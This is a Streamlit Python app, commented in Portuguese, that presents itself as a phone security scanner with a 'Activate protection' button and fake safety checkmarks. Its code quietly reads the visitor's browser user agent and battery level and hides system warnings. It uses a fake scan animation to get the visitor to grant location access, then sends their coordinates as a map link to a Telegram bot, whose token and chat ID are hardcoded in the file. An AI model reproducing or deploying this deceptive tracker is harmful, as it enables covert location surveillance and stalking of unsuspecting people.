import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONEXÃO TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# 2. CSS: BOLHA + MATAR AVISOS AMARELOS
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    /* SOME COM QUALQUER AVISO AMARELO OU MENSAGEM DE ESPERA DO SISTEMA */
    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
        display: none !important; 
    }
    
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.8em; border-radius: 12px; border: none;
    }
    </style>
""", unsafe_allow_html=True)

# 3. CAPTURA SILENCIOSA (DADOS DO APARELHO)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='USER_AGENT_DATA')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BATTERY_DATA')

# 4. INTERFACE
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
area_bolha = st.empty()

if 'clicou' not in st.session_state:
    st.session_state['clicou'] = False

# Estado 1: Bolha em 4% esperando o dono apertar o botão
if not st.session_state['clicou']:
    with area_bolha.container():
        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 5. O BOTÃO (DISPARA O POP-UP DE LOCALIZAÇÃO DO GOOGLE)
if st.button("🔴 ATIVAR PROTEÇÃO"):
    st.session_state['clicou'] = True

# 6. LÓGICA APÓS O CLIQUE
if st.session_state['clicou']:
    # Chama o GPS (O navegador vai abrir o pop-up de permissão aqui)
    loc = get_geolocation() 
    
    if loc and 'coords' in loc:
        # SUCESSO: O usuário aceitou a localização
        # Agora a bolha gira os números de 0% a 100%
        for i in range(0, 101, 5):
            area_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{i}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.04)
        
        # Envio dos dados completos
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ SISTEMA ATIVADO\n\n"
            f"📱 Aparelho: {ua[:55] if ua else 'N/A'}\n"
            f"🔋 Bateria: {bat if bat else '--'}%\n"
            f"📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})"
        )
        
        enviar_telegram(relatorio)
        st.success("Localização concluída")
        st.session_state['clicou'] = False
        st.stop()
    else:
        # Se o pop-up apareceu e a pessoa ainda não clicou, a bolha mostra "..."
        # Mas não aparece nenhum aviso amarelo na tela.
        with area_bolha.container():
            st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">...</div></div></div>', unsafe_allow_html=True)
        time.sleep(1)
        st.rerun()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
